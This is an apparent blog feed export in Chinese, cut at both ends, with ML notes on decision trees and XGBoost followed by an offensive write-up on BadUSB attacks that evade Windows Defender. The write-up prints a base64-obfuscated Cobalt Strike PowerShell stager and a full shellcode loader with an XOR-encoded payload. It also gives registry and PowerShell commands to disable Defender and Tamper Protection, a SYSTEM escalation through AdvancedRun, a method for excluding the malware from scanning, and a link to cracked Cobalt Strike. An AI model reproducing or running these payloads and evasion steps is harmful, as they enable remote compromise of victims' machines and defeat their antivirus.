/><p>如上，计算了从上一步到下一步减少熵最多的，也就是纯度上升（信息增益）最大的。</p><p><strong>问题二：合适停止对节点进行继续分类？</strong></p><ul><li>当一个节点成为只有一种样本的节点，则不继续拆分；</li><li>当分裂已经超过了树的最大深度（根节点为0），则不继续拆分；<em>若树太大，可能过拟合</em></li><li>若继续拆分节点导致的纯度的上升的程度低于阈值，则不继续拆分；</li><li>若某个节点的样本数低于阈值，则不继续拆分；</li></ul><h4 id="2、one-hot编码"><a href="#2、one-hot编码" class="headerlink" title="2、one-hot编码"></a>2、one-hot编码</h4><p>​    当特征不只有两个可能性时，可以将其按照如下的方式转化：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018222201266.png" alt="image-20221018222201266" style="zoom:80%;" /><p>​    如上图，耳朵特征有三种可能的取值，因此可转化为如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018222250568.png" alt="image-20221018222250568"></p><p>​    将一个特征放缩为三个特征，即可继续使用二分类。综上，对于一个有k种可能的特征，可将其放缩为k个特征，同一样本的这k个特征中，一定有且只有一个为1。 </p><h4 id="3、连续有价值特征"><a href="#3、连续有价值特征" class="headerlink" title="3、连续有价值特征"></a>3、连续有价值特征</h4><p>​    当二分类问题中有如下具体数字（weight），而非离散的特征时，可以使用熵将其划分为二分离散特征。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018224656260.png" alt="image-20221018224656260"></p><p>​    如图所示，可通过不断尝试划分情啊坤哥，来确定信息增益最大的划分方式：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018225311222.png" alt="image-20221018225311222" style="zoom:67%;" /><p>​    如上图，选择weight=9 ，也就是绿的划分方式增益最大，因此直接将weight是否小于9作为一个特征就可以了。（上式中的比例系数时正样本在所有样本中所占的比例）</p><h4 id="4、回归树"><a href="#4、回归树" class="headerlink" title="4、回归树"></a>4、回归树</h4><p>​    当希望决策树不仅能预测离散的二分情况，而是能预测数值时，可以使用回归树。其核心思想与决策树相同，只是使用反差来衡量熵的减小情况，入下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221019135346563.png" alt="image-20221019135346563"></p><h4 id="5、决策森林"><a href="#5、决策森林" class="headerlink" title="5、决策森林"></a>5、决策森林</h4><p>​    决策森林的存在用于解决决策树的不健壮问题。<em>不健壮，指决策树训练集的微小变化可能导致决策树的巨幅改变。</em></p><p>​    我们可以构建多个决策树（决策森林），通过多个决策树（决策森林）分别判断结果后进行投票，最终区票数高的结果即可：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221019135926788.png" alt="image-20221019135926788"></p><p>​    根据上上述对于决策树构建过程的叙述，对于同一组样本，决策树的产生是唯一的，因此可以使用<strong>有放回抽样</strong>的方式，构造伪随机样本集。 <em>有放回抽样，就是在n个样本中抽n次，每次抽完后记录结果并放回。</em> </p><p>​    即使使用了上述方法构造有放回抽样的随机森林，决策森林也有可能出现节点顺序、结构依然相似的情况。此时可以在生成新节点时不用所有特征进行判定比较，而是在<strong>n个特征中选择其子集</strong>（假设包含k个特征）进行对于节点特征的选取工作，当n较大，一般k取n的平方根。</p><p>​    以上方式，都是构建决策森林的方式，同样的，有一种决策森林构建法叫做xgboosting</p><h4 id="6、XGBoost"><a href="#6、XGBoost" class="headerlink" title="6、XGBoost"></a>6、XGBoost</h4><p>​    XGBoost的核心思想是，构建新的决策树时，提高上一个决策树判断错误的样本出现的频率。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221019143242607.png" alt="image-20221019143242607"></p><p>​    如上所示，假设第b-1个决策树如图所示，其中有三个样本判断错误，就应在构建第b棵决策树时提高这三个样本出现的概率。</p><p>​    更多细节没讲，可以使用 <em>from xgboost import XGBClassifier</em> 来使用这一模型</p><h4 id="7、决策树-amp-神经网络"><a href="#7、决策树-amp-神经网络" class="headerlink" title="7、决策树&amp;神经网络"></a>7、决策树&amp;神经网络</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221019143700754.png" alt="image-20221019143700754"></p>]]></content>
      
      
      <categories>
          
          <category> ai </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>badusb针对windowsDefender的免杀思路</title>
      <link href="/2022/09/09/badusb%E9%92%88%E5%AF%B9windowsDefender%E7%9A%84%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/09/09/badusb%E9%92%88%E5%AF%B9windowsDefender%E7%9A%84%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="badusb针对windowsDefender的免杀思路"><a href="#badusb针对windowsDefender的免杀思路" class="headerlink" title="badusb针对windowsDefender的免杀思路"></a>badusb针对windowsDefender的免杀思路</h1><p>​    本实验在windows10版本达成badusb攻击环境的搭建，并达成免杀。</p><h2 id="一、cs的基本使用"><a href="#一、cs的基本使用" class="headerlink" title="一、cs的基本使用"></a>一、cs的基本使用</h2><p>​    cs强于msf的关键就在于，msf的攻击程序都默认运行在本机上，攻击者需要在本机上操作，才能达成完整的攻击流程，而这样的要求，对于公网服务器用户是极为不方便的。与之对应的，cs的架构如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220907152958346.png" alt="image-20220907152958346"></p><p>​    攻击者团队中的成员可以共享与公网server连接的shell，并通过server控制靶机，这样当攻击者下线后，只要服务器不关闭，shell就一直存在（当然，持久化也能达到同样的效果）。同时，在服务器端需要进行的操作也仅仅是在安装java环境后，开启teamserver服务器，不需要额外的操作。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220903154223922.png" alt="image-20220903154223922"></p><p>​    在服务器端打开后，在客户端启动客户端程序，并与之进行连接即可。这里记录一下优秀的cs下载地址：</p><ul><li><a href="https://www.ddosi.org/cobaltstrike-4-5-cracked/">https://www.ddosi.org/cobaltstrike-4-5-cracked/</a></li></ul><h2 id="二、免杀思路"><a href="#二、免杀思路" class="headerlink" title="二、免杀思路"></a>二、免杀思路</h2><p>要达成windows defender免杀，其实有三种思路：</p><ol><li>通过设计后门脚本，通过加壳、混淆等方式使得脚本无法被杀毒软件识别，达成免杀</li><li>通过使用badusb自带的命令执行，直接将windows defender沉默，使其防御彻底失效，达成免杀</li><li>通过处理，将后门脚本通过合规的手段，在windows defender中设为免杀项，达成免杀</li></ol><p>本文中，最终达成免杀的方式是 <strong>方案三</strong>，但是本文也将记录前两个方案的实践过程和遇到的问题。</p><h3 id="1、powershell免杀程序的尝试"><a href="#1、powershell免杀程序的尝试" class="headerlink" title="1、powershell免杀程序的尝试"></a>1、powershell免杀程序的尝试</h3><h4 id="混淆尝试："><a href="#混淆尝试：" class="headerlink" title="混淆尝试："></a>混淆尝试：</h4><p>cs可以一键生成powershell的payload如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220907153745849.png" alt="image-20220907153745849"></p><p>这个程序是无法静态免杀的，我们可以通过base64+拼接实现对于windows defender的静态免杀：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt1</span> = <span class="string">&#x27;CmZ1bmN0aW9uIGFzZHNhIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZ&#x27;</span></span><br><span class="line"><span class="variable">$DoIt2</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">WR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLk此处省略一部分内容IChzZGZ6enogQChbSW50UHRyXSkgKFtWb2</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"><span class="variable">$DoIt3</span> = <span class="string">&#x27;lkXSkpKQokdmFyX3J1bm1lLkludm9rZShbSW50UHRyXTo6WmVybyk=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$DoIt1</span> + <span class="variable">$DoIt2</span> + <span class="variable">$DoIt3</span>))</span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$DoIt</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$DoIt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    然而，即使绕过了静态免杀也没有用，使用如下语句执行脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> .\payload.ps1</span><br></pre></td></tr></table></figure><p>​    执行脚本时，依然会给你如下报错：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220907165056830.png" alt="image-20220907165056830"></p><h4 id="脚本内容解析："><a href="#脚本内容解析：" class="headerlink" title="脚本内容解析："></a>脚本内容解析：</h4><p>引导程序：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="comment">#使用int指针大小是否为8，判断系统位数是否为x64</span></span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$DoIt</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line"><span class="comment">#开始执行DoIt的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$DoIt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_get_proc_address</span></span> &#123;</span><br><span class="line"><span class="comment">#高级函数</span></span><br><span class="line"><span class="keyword">Param</span> (<span class="variable">$var_module</span>, <span class="variable">$var_procedure</span>)<span class="comment">#两个参数</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$var_unsafe_native_methods</span> = ([<span class="type">AppDomain</span>]::CurrentDomain.GetAssemblies() | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.GlobalAssemblyCache <span class="operator">-And</span> <span class="variable">$_</span>.Location.Split(<span class="string">&#x27;\\&#x27;</span>)[-<span class="number">1</span>].Equals(<span class="string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)</span><br><span class="line"><span class="comment">#[AppDomain]::CurrentDomain.GetAssemblies()获取appdomian的程序集</span></span><br><span class="line"><span class="comment">#通过管道符，找到System.dll</span></span><br><span class="line"><span class="comment">#使用getType访问unsafeMethod</span></span><br><span class="line"><span class="comment">#综上，通过一系列操作，访问了UnsafeNativeMethods，这是由于该内部类不允许直接访问，故需要通过上述方式绕过</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$var_gpa</span> = <span class="variable">$var_unsafe_native_methods</span>.GetMethod(<span class="string">&#x27;GetProcAddress&#x27;</span>, [<span class="type">Type</span>[]] <span class="selector-tag">@</span>(<span class="string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="string">&#x27;string&#x27;</span>))</span><br><span class="line"><span class="comment">#从中提取能访问GetProcAddress，用于检索指定的动态链接库(DLL)中的输出库函数地址</span></span><br><span class="line"><span class="comment">#搜索参数与指定参数类型匹配的指定公共方法。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$var_gpa</span>.Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>([<span class="type">System.Runtime.InteropServices.HandleRef</span>](<span class="built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="built_in">New-Object</span> IntPtr), (<span class="variable">$var_unsafe_native_methods</span>.GetMethod(<span class="string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>(<span class="variable">$var_module</span>)))), <span class="variable">$var_procedure</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_get_delegate_type</span></span> &#123;</span><br><span class="line"><span class="keyword">Param</span> (</span><br><span class="line">[<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">0</span>, <span class="type">Mandatory</span> = <span class="variable">$True</span>)] [<span class="type">Type</span>[]] <span class="variable">$var_parameters</span>,</span><br><span class="line">[<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">1</span>)] [<span class="type">Type</span>] <span class="variable">$var_return_type</span> = [<span class="built_in">Void</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后是一个AssemblyBuilder.DefineDynamicAssembly 方法，主要用来定义动态程序集。</span></span><br><span class="line"><span class="variable">$var_type_builder</span> = [<span class="type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="built_in">New-Object</span> System.Reflection.AssemblyName(<span class="string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="string">&#x27;InMemoryModule&#x27;</span>, <span class="variable">$false</span>).DefineType(<span class="string">&#x27;MyDelegateType&#x27;</span>, <span class="string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="type">System.MulticastDelegate</span>])</span><br><span class="line"></span><br><span class="line"><span class="variable">$var_type_builder</span>.DefineConstructor(<span class="string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="type">System.Reflection.CallingConventions</span>]::Standard, <span class="variable">$var_parameters</span>).SetImplementationFlags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$var_type_builder</span>.DefineMethod(<span class="string">&#x27;Invoke&#x27;</span>, <span class="string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="variable">$var_return_type</span>, <span class="variable">$var_parameters</span>).SetImplementationFlags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$var_type_builder</span>.CreateType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密base64，得到byte数组，可以接[byte[]]$var_code[0..10]查看其内部的内容</span></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$var_code</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktzIyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMaEpGYCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxQNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TCi4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcGxINFBMNFhENERIjIyMjIw==&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#$var_code.Count = 260608 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$var_code</span>.Count; <span class="variable">$x</span>++) &#123;</span><br><span class="line"><span class="comment">#遍历其中的元素，异或解密</span></span><br><span class="line"><span class="variable">$var_code</span>[<span class="variable">$x</span>] = <span class="variable">$var_code</span>[<span class="variable">$x</span>] <span class="operator">-bxor</span> <span class="number">35</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过委托实例调用方法，并且GetDelegateForFunctionPointer可以将非托管函数指针转换为委托</span></span><br><span class="line"><span class="comment">#传递给委托方法的第一个参数是对VirtualAlloc的调用；第二个参数是动态创建的程序集</span></span><br><span class="line"><span class="variable">$var_va</span> = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>])))</span><br><span class="line"><span class="comment">#相当于将一个函数的调用模型赋值给一个变量，后续进行调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##[System.Runtime.InteropServices.Marshal]::Copy：将数据从非托管内存指针复制到托管单精度浮点数数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用$var_va中的func_get_delegate_type函数，传入参数</span></span><br><span class="line"><span class="variable">$var_buffer</span> = <span class="variable">$var_va</span>.Invoke([<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$var_code</span>.Length, <span class="number">0</span>x3000, <span class="number">0</span>x40)</span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$var_code</span>, <span class="number">0</span>, <span class="variable">$var_buffer</span>, <span class="variable">$var_code</span>.length)</span><br><span class="line"></span><br><span class="line"><span class="variable">$var_runme</span> = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="variable">$var_buffer</span>, (func_get_delegate_type <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>]) ([<span class="built_in">Void</span>])))</span><br><span class="line"><span class="variable">$var_runme</span>.Invoke([<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero)</span><br></pre></td></tr></table></figure><p>剩下的，看不懂了，可以参看：</p><p>​    <a href="https://cloud.tencent.com/developer/article/1873609?from=article.detail.1873706">https://cloud.tencent.com/developer/article/1873609?from=article.detail.1873706</a></p><p>​    总而言之，现在遇到的问题就是通过简单的对于文件格式的拆解虽然可以达成静态的免杀，但是由于Beacon自带的特征，一旦程序进入运行状态，就导致会被windows defender干掉，若能对powershell理解更为深刻，手动重构代码，可能能够达成进一步的免杀。</p><h3 id="2、使用注册表沉默Windows-defender之路"><a href="#2、使用注册表沉默Windows-defender之路" class="headerlink" title="2、使用注册表沉默Windows defender之路"></a>2、使用注册表沉默Windows defender之路</h3><h4 id="使用注册表沉默windows-defender："><a href="#使用注册表沉默windows-defender：" class="headerlink" title="使用注册表沉默windows defender："></a>使用注册表沉默windows defender：</h4><p>​    在失败构造免杀脚本后，我产生了一个大胆的想法，是否能够直接沉默windows defender，使其失效，在探索过后，我发现自windows defender添加了防篡改功能，就不容易沉默windows defender了，研究收获如下：</p><p>​    要沉默windows defender，有两个路径的表项需要进行修改：</p><ul><li>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender</li><li>HKLM\SOFTWARE\Microsoft\Security Center\Provider\Av{D68DDC3A-831F-4fae-9E44-DA132C1ACF46}</li></ul><p>​    </p><p>​    对于第一个表项，需要添加：</p><ul><li>DisableAntiSpyware    ：    1</li><li>DisableAntiVirus    ：    1</li></ul><p>可使用语句如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware /t reg_dword /d <span class="number">1</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiVirus /t reg_dword /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure><p>对于第二个表项，需要修改：</p><ul><li>STATE = 0x00060100</li></ul><p>理论上，可使用语句：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Security Center\Provider\Av\&#123;D68DDC3A-831F-4fae-9E44-DA132C1ACF46&#125;&quot;</span> /v STATE /t reg_dword /d <span class="string">&quot;0x00060100&quot;</span> /f</span><br></pre></td></tr></table></figure><p>​    然而自windows defender添加防篡改功能后，不能使用此语句进行修改，会报无权限错误，即使提权到管理员权限，依然不能操纵改值，我们参看如下官方文档：</p><p><a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide">https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide</a></p><blockquote><p>Tamper protection essentially locks Microsoft Defender Antivirus to its secure, default values, and prevents your security settings from being changed through apps and methods such as:</p><ul><li>Configuring settings in Registry Editor on your Windows device</li><li>Changing settings through PowerShell cmdlets</li><li>Editing or removing security settings through Group Policy</li></ul></blockquote><p>​    其意为，防篡改保护将如下的索性设定为固定值，并防止这些设置受到如下方式的更改，包括：</p><ul><li>windows设备的注册表编辑器中配置</li><li>通过powershell cmdlet更改</li><li>通过组策略更改</li></ul><p>​    我们打开注册表手动更改，发现依然无法更改：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220909132145268.png" alt="image-20220909132145268"></p><p>​    同样的，源本可以使用powershell执行如下代码，直接关闭windows defender，开启防篡改后，此方法也变为无效方法：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$preferences</span> = <span class="built_in">Get-MpPreference</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> (!<span class="variable">$preferences</span>.DisableRealtimeMonitoring)</span><br></pre></td></tr></table></figure><p>​    顺理成章地，我们应尝试关闭windows defender的防篡改（<em>Tamper Protection</em>）功能，才能对我们想修改的配置进行编辑。</p><h4 id="尝试关闭Tamper-Protection"><a href="#尝试关闭Tamper-Protection" class="headerlink" title="尝试关闭Tamper Protection"></a>尝试关闭Tamper Protection</h4><p>​    首先，可使用如下语句查看防篡改功能开启情况：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features&quot;</span> /v <span class="string">&quot;TamperProtection&quot;</span></span><br></pre></td></tr></table></figure><p>​    返回结果中的数值5代表开启，数值4则代表关闭。</p><p>​    理论上，应通过下面的语句关闭Windows Defneder，即设置数值为4：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features&quot;</span> /v <span class="string">&quot;TamperProtection&quot;</span> /d <span class="number">4</span> /t REG_DWORD /f</span><br></pre></td></tr></table></figure><p>​    然而，防篡改本身也有防篡改。</p><h4 id="对于进一步提权的尝试"><a href="#对于进一步提权的尝试" class="headerlink" title="对于进一步提权的尝试"></a>对于进一步提权的尝试</h4><p>​        在执行上述语句的过程中，无论我们是以当前用户权限，还是以管理员身份打开cmd，执行都会显示如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220909135149021.png" alt="image-20220909135149021"></p><p>​    我们不得不质疑，是否是我们的权限依然不够呢?</p><p>​    在windows 的权限管理机制下，凌驾于所有<strong>LocalUser</strong>和<strong>WebUser</strong>之上还有一类用户，叫做<strong>LocalSystem</strong>，正常情况下，我们无法提升到此权限，但是我们可以依靠提权工具AdvancedRun.exe，在如下地址下载：</p><p><a href="https://www.nirsoft.net/utils/advanced_run.html">https://www.nirsoft.net/utils/advanced_run.html</a></p><p>​    而后，可以使用语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdvancedRun.exe /EXEFilename &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; /RunAs 8 /Run</span><br></pre></td></tr></table></figure><p>​    进行提权，提权后，权限为：<strong>nt authority\system</strong></p><p>​    我们可以使用此权限打开任意的命令行窗口或者powershell，并按照上述思路进行命令执行，然而，在提升权限后，虽然命令不再执行失败，但是执行后依然无法绕过Tamper Protection的防护，体现为没有任何效果：</p><p>​    注意：</p><p><code>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender    ：    1</code> </p><p>​    会导致windows defender报毒，不过反正也走不通，所以无所谓了，至此，使用注册表沉默windows defender彻底失败。</p><h3 id="3、将恶意脚本添加到排除项"><a href="#3、将恶意脚本添加到排除项" class="headerlink" title="3、将恶意脚本添加到排除项"></a>3、将恶意脚本添加到排除项</h3><p>​    经过上述操作，发现在防篡改机制存在的情况下修改windows defender相关的注册表，因而应在不修改配置的情况下，尽量排除脚本，最终使用的方法是，使用注册表配置排除项，使得木马不会被查杀。</p><p>​    我们可以通过手动添加注册表，然后在注册表中搜索对应项目：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220909153703845.png" alt="image-20220909153703845"></p><p>​    将位置锁定到注册表：</p><p><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</code></p><p>​    